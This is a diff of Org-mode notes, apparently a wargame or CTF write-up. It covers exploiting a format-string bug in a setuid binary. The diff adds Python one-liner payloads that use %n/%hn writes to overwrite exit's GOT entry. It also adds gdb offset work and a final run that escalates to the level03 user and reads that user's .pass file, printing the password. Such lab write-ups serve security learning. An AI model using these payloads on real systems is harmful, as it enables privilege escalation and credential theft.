@@ -357,7 +357,6 @@ Must unsetenv because could make trouble on others syscalls for example execve.
     {
       return (0);
     }
-
 #+end_src
 
 #+begin_src shell
@@ -521,16 +520,17 @@ https://man7.org/linux/man-pages/man3/printf.3.html
 #+end_quote
 **** Get offset
 #+begin_src shell
-          string format test
+            string format test
 
-      --[ Username: BBBBBBBB%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
-    look like yes
-      BBBBBBBB0x7fffffffea20(nil)0x610x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffec180x1f7ff9a080x61(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)0x4242424242424242#Here is the buffer.
-  BBBBBBBB%28$p%29$p%30$p Format string.
-BBBBBBBB0x42424242424242420x39322570243832250x70243033257024 does not have access!
+        --[ Username: BBBBBBBB%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+      look like yes
+        BBBBBBBB0x7fffffffea20(nil)0x610x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffec180x1f7ff9a080x61(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)0x4242424242424242#Here is the buffer.
+    BBBBBBBB%28$p%29$p%30$p Format string.
+  BBBBBBBB0x42424242424242420x39322570243832250x70243033257024 does not have access!
+
+  
 #+end_src
 offset = 28
-
 **** CANC print the string.
 CLOSED: [2025-11-28 Fri 06:48]
 #+begin_src shell
@@ -547,38 +547,54 @@ CLOSED: [2025-11-28 Fri 06:48]
 #+end_src
 ***** Fix the stack ptr.
 #+begin_src shell
-  unset env LINES
-  unset env COLUMNS
-  b main
-  r
-  p/x $rbp-0xA0
-  passwd_va = 0x7fffffffea80
-  (python -c 'print "\x00\x00\x7f\xff\xff\xff\xea\x80"[::-1]+"%28$s"'; cat - ) | $PWD/$USER
-
+use ltrace for get  the real stack ptr.
 #+end_src
 *** Use exit got
 #+begin_src shell
-    (gdb) x/i exit
-    0x400710 <exit@plt>:	jmpq   *0x200b12(%rip)        # 0x601228 <exit@got.plt>
-    (gdb) x/lga  0x601228
-    0x601228 <exit@got.plt>:	0x400716 <exit@plt+6>
-    exit_got_plt_va = 0x601228 <exit@got.plt>
-    main_va =  0x0000000000400a85
+         (gdb) x/i exit
+         0x400710 <exit@plt>:	jmpq   *0x200b12(%rip)        # 0x601228 <exit@got.plt>
+         (gdb) x/lga  0x601228
+         0x601228 <exit@got.plt>:	0x400716 <exit@plt+6>
+         exit_got_plt_va = 0x601228 <exit@got.plt>
+         main_va =  0x0000000000400a85
 
-    p/x (int)0x0000000000400a85
-    $1 = 0x400a85
-    p/d (int)0x0000000000400a85
-    4196997
-  p/x (short[2])0x0000000000400a85
-  $5 = {0xa85, 0x40}
-  p/d (short[2])0x0000000000400a85
-  $6 = {2693, 64}
-   #64 - 14 = 50
-   #2693 - 64 = 2629
-
-    (python -c 'print "\x00\x00\x00\x00\x00\x60\x12\x28"[::-1]+ "\x00\x00\x00\x00\x00\x60\x12\x32"[::-1]+"%50d%28$hn%2629d%29$hn"'; cat - ) | $PWD/$USER
+         p/x (int)0x0000000000400a85
+         $1 = 0x400a85
+         p/d (int)0x0000000000400a85
+         4196997
+       p/x (short[2])0x0000000000400a85
+       $5 = {0xa85, 0x40}
+       p/d (short[2])0x0000000000400a85
+       $6 = {2693, 64}
+        #64 - 16 = 68
+        #2693 - 64 = 2629
+   	#printf wasn't  working cause nulls previous to buffer format.
 #+end_src
-* Exploit
+***** One  write
+#+begin_src
+           (python -c 'print "%4196989d%30$n"+"a"*2 +"\x00\x00\x00\x00\x00\x60\x12\x28"[::-1]'; cat - ) | $PWD/$USER
+
+
+
+   %4196989d%30$haa(`     
+#+end_src
+***** Two writes.
 #+begin_src shell
+
+  %64d%31$hn%2629d%32$hnaa*`     (`      
+           (python -c 'print "%64d%31$hn%2629d%32$hn"+"a"*2 +"\x00\x00\x00\x00\x00\x60\x12\x2a"[::-1] + "\x00\x00\x00\x00\x00\x60\x12\x28"[::-1]'; cat - ) | $PWD/$USER
+   
+    #+end_src
+* Exploit
+
+#+begin_src shell
+(python -c 'print "%64d%31$hn%2629d%32$hn"+"a"*2 +"\x00\x00\x00\x00\x00\x60\x12\x2a"[::-1] + "\x00\x00\x00\x00\x00\x60\x12\x28"[::-1]'; cat - ) | $PWD/$USER
+  0aa*` does not have access!
+  id
+  uid=1002(level02) gid=1002(level02) euid=1003(level03) egid=100(users) groups=1003(level03),100(users),1002(level02)
+  whoami
+  level03
+  cat /home/users/`whoami`/.pass
+  Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
 
 #+end_src
